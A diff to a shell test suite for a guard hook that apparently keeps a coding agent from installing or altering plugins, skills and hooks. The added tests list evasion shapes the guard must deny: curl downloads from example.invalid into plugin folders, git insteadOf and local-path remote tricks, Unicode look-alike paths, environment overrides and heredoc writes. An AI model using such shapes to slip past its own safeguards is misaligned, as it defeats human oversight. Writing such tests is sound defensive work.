@@ -402,9 +402,12 @@ run "$GUARD" "$(bash_p "git cherry-pick old")";                 expect "git cher
 run "$GUARD" "$(bash_p "git merge --abort")";                   expect "control: merge --abort" none
 run "$GUARD" "$(bash_p "git pull . old")";                      expect "threat model: git pull . old is a local merge" deny
 run "$GUARD" "$(bash_p "git pull $WORK/forge main")";           expect "threat model: a pull from a path is not origin" deny
-git -C "$P" remote add origin "$WORK/origin.git" 2>/dev/null
+git -C "$P" remote add origin "https://example.invalid/origin.git" 2>/dev/null
 run "$GUARD" "$(bash_p "git pull origin main")";                expect "O3: a pull from a configured remote is allowed" none
 run "$GUARD" "$(bash_p "git pull")";                            expect "O3: a bare pull is allowed" none
+git -C "$P" remote add local "$WORK/origin.git" 2>/dev/null
+run "$GUARD" "$(bash_p "git pull local main")";                 expect "095a TM-14: a configured remote whose URL is a path" deny
+run "$GUARD" "$(bash_p "git -c url.$WORK/.insteadOf=https://example.invalid/ pull origin main")"; expect "095a TM-14: insteadOf on the command line (git -c)" deny
 git -C "$P" config alias.co checkout
 run "$GUARD" "$(bash_p "git co $REV -- .")";                    expect "threat model: an alias for checkout" deny
 run "$GUARD" "$(bash_p "git update-ref refs/heads/safe $REV && git checkout safe -- .")"; expect "threat model: a ref moved on the same line" deny
@@ -576,7 +579,7 @@ BLOB=$(printf '{}\n' | git -C "$MR" hash-object -w --stdin)
 git -C "$MR" update-index --add --cacheinfo "100644,$BLOB,mods/q/hooks/hooks.json" || bad "fixture: index entry"
 run "$GUARD" "$(mbash_p "git checkout -- .")";                             expect "plumbing: an index entry checked out" deny
 (cd "$MR" && git rm -q --cached mods/q/hooks/hooks.json) || bad "fixture: drop index entry"
-git -C "$MR" remote add origin "$WORK/origin.git" 2>/dev/null
+git -C "$MR" remote add origin "https://example.invalid/m.git" 2>/dev/null
 run "$GUARD" "$(mbash_p "git pull origin main")";                          expect "M3: a pull from a configured remote" none
 OUT=$(mbash_p "git checkout $MREV -- ." | (cd "$MR" && CLAUDE_PROJECT_DIR="$MR" SETTINGS_GUARD_GIT_TIMEOUT=0.000001 "$BASH_BIN" "$GUARD") 2>/dev/null); VERDICT=$(hook_verdict "$OUT")
 expect "Q20: a git timeout denies" deny
@@ -611,6 +614,72 @@ case "$(reason)" in *"no override"*) ok "  the reason says there is no override"
 case "$(reason)" in *'!'*) ok "  and names the ! route" ;; *) bad "  no ! route in the reason" ;; esac
 run "$GUARD" "$(jq -cn --arg w "$MX/lib" '{tool_name:"Bash",tool_input:{command:"printf x > zz.ts"},cwd:$w}')"; expect "R6 a cwd inside a plugin folder" deny
 run "$GUARD" "$(write_p "$P/src/ordinary.ts" 'x')";                         expect "control: an ordinary file still never wakes it" none
+
+printf '\n[095a threat model] the shapes the STRIDE pass adopted\n'
+run "$GUARD" "$(bash_p 'printf x > $D/skills/evil/hooks/r.ts')";            expect "TM-6 an unresolved \$D with a skills tail" deny
+run "$GUARD" "$(bash_p 'cd $X/skills && tar xf /tmp/m.tar')";               expect "TM-6 a lost cd in a command naming skills" deny
+run "$GUARD" "$(bash_p "cd ~/.claude/skills && git clone https://example.invalid/m.git")"; expect "TM-5 cd into the skills root, then git clone" deny
+run "$GUARD" "$(bash_p "cd ~/.claude/skills && ls")";                      expect "control: cd into the skills root, then ls" none
+run "$GUARD" "$(jq -cn --arg w "$CF/skills" '{tool_name:"Bash",tool_input:{command:"tar xf /tmp/m.tar"},cwd:$w}')"; expect "TM-5 a payload cwd in the skills root, then tar" deny
+run "$GUARD" "$(bash_p "find .claude/skills -name SKILL.md")";              expect "TM-36 find over the project skills" none
+run "$GUARD" "$(bash_p "find .claude/skills -name x -exec cp /tmp/m {} +")"; expect "TM-36 find -exec into the project skills" deny
+run "$GUARD" "$(bash_p "rm -r .claude/skills/old")";                        expect "TM-37 rm -r of an old project skill" none
+run "$GUARD" "$(bash_p "python3 -c 'import os; print(os.listdir(\".claude/skills\"))'")"; expect "TM-38 a python3 -c inventory of the skills" none
+run "$GUARD" "$(bash_p "bash -c 'claude plugin install x@y'")";             expect "TM-18 claude plugin inside bash -c" deny
+run "$GUARD" "$(bash_p "claude --plugin-dir=/tmp/m -p hi")";                expect "TM-18 --plugin-dir=" deny
+run "$GUARD" "$(bash_p "claude --debug plugin install x")";                 expect "TM-18 an option before plugin" deny
+run "$GUARD" "$(bash_p "claude --plugin-url https://example.invalid/m.zip -p hi")"; expect "R10 --plugin-url fetches a plugin for the session" deny
+run "$GUARD" "$(bash_p "CLAUDE_CONFIG_DIR=/tmp/c claude -p hi")";           expect "TM-15 CLAUDE_CONFIG_DIR on claude" deny
+run "$GUARD" "$(bash_p "HOME=/tmp/h claude -p hi")";                        expect "TM-15 HOME on claude" deny
+run "$GUARD" "$(bash_p 'git commit -m "docs: CLAUDE_CODE_PLUGIN_DIRS= is read from settings"')"; expect "TM-39 the name inside a commit message" none
+jq --arg d "$WORK/pd" '. + {env: {CLAUDE_CODE_PLUGIN_DIRS: $d}}' "$SD" > "$WORK/sd.json" && cp "$SD" "$WORK/sd.bak" && cp "$WORK/sd.json" "$SD"
+run "$GUARD" "$(write_p "$WORK/pd/a.ts" 'x')";                              expect "TM-16 a folder on CLAUDE_CODE_PLUGIN_DIRS (project settings env)" deny
+cp "$WORK/sd.bak" "$SD"
+run "$GUARD" "$(write_p "$P/other/.claude/plugins/x/r.ts" 'x')";            expect "TM-21 another project's .claude/plugins" deny
+run "$GUARD" "$(mcp_p mcp__docs__update '{"text":"the plugin manifest sits beside its hooks"}')"; expect "TM-31 MCP prose about plugins" none
+run "$GUARD" "$(bash_p "printf 'x > mods/x/hooks/r.ts")";                   expect "an unbalanced quote naming a mod" deny
+if [ "$(uname)" = Darwin ]; then
+  run "$GUARD" "$(write_p "$P/deep2/hook$(printf '\xc5\xbf')/hooks.json" '{}')"; expect "TM-1 hook<long s>/hooks.json opens as hooks/hooks.json" deny
+fi
+BLOB=$(printf '{}\n' | git -C "$MR" hash-object -w --stdin)
+git -C "$MR" update-index --add --cacheinfo "100644,$BLOB,mods/t/hooks/hooks.json" || bad "fixture: tree entry"
+TREE=$(git -C "$MR" write-tree); (cd "$MR" && git rm -q --cached mods/t/hooks/hooks.json) || bad "fixture: drop tree entry"
+run "$GUARD" "$(mbash_p "git read-tree -u -m $TREE")";                      expect "TM-24 read-tree of a bare tree that holds a mod" deny
+run "$GUARD" "$(mbash_p "git checkout $TREE -- .")";                        expect "TM-24 checkout of a bare tree" deny
+mkdir -p "$MR/mods/s/hooks"; printf '{}\n' > "$MR/mods/s/hooks/hooks.json"
+(cd "$MR" && git stash -q -u) || bad "fixture: stash -u"
+run "$GUARD" "$(mbash_p "git stash pop")";                                 expect "stash pop that brings an untracked mod back" deny
+(cd "$MR" && git stash drop -q) || bad "fixture: stash drop"
+mkdir -p "$MR/mods/u/hooks"; printf '{}\n' > "$MR/mods/u/hooks/hooks.json"
+run "$GUARD" "$(mbash_p "git clean -fd")";                                  expect "git clean that removes an untracked mod" deny
+rm -rf "$MR/mods/u"
+run "$GUARD" "$(mbash_p "git clean -fd")";                                  expect "control: git clean with no mod in the way" none
+
+printf '\n[095a adversarial review] shapes the first pass let through, and two it refused wrongly\n'
+mkdir -p "$WORK/outside/plug/.claude-plugin" "$WORK/Dev Stuff/plug/.claude-plugin"
+run "$GUARD" "$(bash_p 'n=x; cp -r /tmp/m ~/.claude/skills/$n')";             expect "#1 an unresolved name under the skills root" deny
+run "$GUARD" "$(bash_p 'D=plugins; cp -r /tmp/m ~/.claude/$D/m')";           expect "#1 an unresolved folder under .claude" deny
+run "$GUARD" "$(bash_p 'cat ~/.claude/skills/$n/SKILL.md')";                  expect "control: a read of an unresolved skill" none
+run "$GUARD" "$(bash_p "$(printf "python3 - <<'EOF'\nopen('%s/outside/plug/x.ts','w').write('x')\nEOF" "$WORK")")"; expect "#2 a python heredoc writing into a plugin folder" deny
+run "$GUARD" "$(bash_p "$(printf "cat <<'EOF'\n%s/outside/plug/x.ts\nEOF" "$WORK")")"; expect "control: a cat heredoc naming one is data" none
+run "$GUARD" "$(bash_p "curl -o $WORK/outside/plug/mod.ts https://example.invalid/x")"; expect "#3 curl -o into a plugin folder outside every root" deny
+run "$GUARD" "$(write_p "$WORK/cfg/$(printf '\xc5\xbf')kills/x/hook$(printf '\xc5\xbf')/hook$(printf '\xc5\xbf').json" '{}')"; expect "#4 a long-s spelling with no wake word" deny
+run "$GUARD" "$(mcp_p mcp__fs__write_file "$(jq -cn --arg p "$WORK/Dev Stuff/plug/mod.ts" '{path:$p,content:"x"}')")"; expect "#5 an MCP path with a space into a plugin folder" deny
+run "$GUARD" "$(bash_p "env -u FOO claude -p hi --plugin-dir /tmp/m")";      expect "#6 env -u FOO claude --plugin-dir" deny
+run "$GUARD" "$(bash_p "sudo -u u claude plugin install x")";                 expect "#6 sudo -u u claude plugin install" deny
+run "$GUARD" "$(bash_p 'cd "$(git rev-parse --show-toplevel)" && bash scripts/validate-hooks.sh')"; expect "#8 a lost cd, then a script with hooks in its name" none
+run "$GUARD" "$(bash_p "cp -r .claude/skills/tla /tmp/x")";                   expect "#9 copying a project skill out" none
+run "$GUARD" "$(bash_p "tar czf /tmp/b.tgz .claude/skills")";                 expect "#9 archiving the project skills" none
+run "$GUARD" "$(bash_p "tar xzf /tmp/b.tgz -C .claude/skills")";              expect "control: extracting into them" deny
+run "$GUARD" "$(bash_p "cp -r /tmp/x -t .claude/skills")";                    expect "control: cp -t into them" deny
+printf '\n[095a /security-review] the pre-check fails toward the verdict\n'
+run "$GUARD" "$(bash_p "cd $WORK/outside && curl -so plug/register.ts https://example.invalid/x")"; expect "SR-1 cd, then curl into a plugin folder by a relative name" deny
+mkdir -p "$HOME/dev/plug/.claude-plugin"
+run "$GUARD" "$(bash_p "curl -so \"\$HOME\"/dev/plug/register.ts https://example.invalid/x")"; expect "SR-1 curl into \$HOME/… that is a plugin folder" deny
+mkdir -p "$WORK/q\""
+run "$GUARD" "$(write_p "$WORK/q\"/../outside/plug/register.ts" 'x')";    expect "SR-2 a quote in a folder name, then .. into a plugin folder" deny
+run "$GUARD" "$(write_p "$WORK/outside/notes/../plug/register.ts" 'x')";   expect "SR-2 a .. segment alone into a plugin folder" deny
+run "$GUARD" "$(bash_p "curl -so $WORK/outside/notes.txt https://example.invalid/x")"; expect "control: curl to an ordinary file" none
 
 printf '\n[sabotage] each rule is what denies its attack\n'
 sabotage() { # sabotage <label> <old> <new> <payload>
@@ -653,6 +722,27 @@ sabotage "sabotage 095-R3: without the MCP scan a write tool passes" \
 sabotage "sabotage 095-R1: without the conflict rule a both-sides merge passes" \
   'out.append((rel, h, t if h in (b, t) else CONFLICT))' 'out.append((rel, h, h))' \
   "$(bash_p "git merge old")"
+sabotage "sabotage 095a-R1: without mod paths in file_of a Write into a plugin folder passes" \
+  'return self.mod_of(p) if mods else None' 'return None' \
+  "$(write_p "$MX/lib/util.ts" 'x')"
+sabotage "sabotage 095a-R1(c): without the ancestor walk a file under an innocent name passes" \
+  'if self.in_plugin_folder(os.path.realpath(p)) or self.in_plugin_folder(os.path.normpath(p)):' 'if False:' \
+  "$(write_p "$MX/lib/util.ts" 'x')"
+sabotage "sabotage 095a-R3: without the soft/hard split mv into a project skill passes" \
+  'and (g.mod_hits.get(h) != "soft" or placing_target(words, i))]' 'and g.mod_hits.get(h) != "soft"]' \
+  "$(bash_p "mv /tmp/s .claude/skills/tla")"
+sabotage "sabotage 095a-TM-5: without the mod base a program run in the skills root passes" \
+  'if (mod_base or lost_mod) and words' 'if False and words' \
+  "$(bash_p "cd ~/.claude/skills && /tmp/x/installer")"
+sabotage "sabotage 095a-R4: without mod candidates git checkout REV -- . passes" \
+  'if rel not in self.files and g.mod_of(full)' 'if False and g.mod_of(full)' \
+  "$(mbash_p "git checkout $MREV -- .")"
+sabotage "sabotage 095a-R10: without the claude CLI check plugin install passes" \
+  'why = claude_cli_verdict(words)' 'why = None' \
+  "$(bash_p "claude plugin install x@y")"
+sabotage "sabotage 095a-TM-14: without the URL check a pull from a local remote passes" \
+  'raise GitUnknown("a pull from a remote whose URL is a local path")' 'return None' \
+  "$(bash_p "git pull local main")"
 
 printf '\n%d passed, %d failed\n' "$PASS" "$FAIL"
 [ "$FAIL" -eq 0 ]
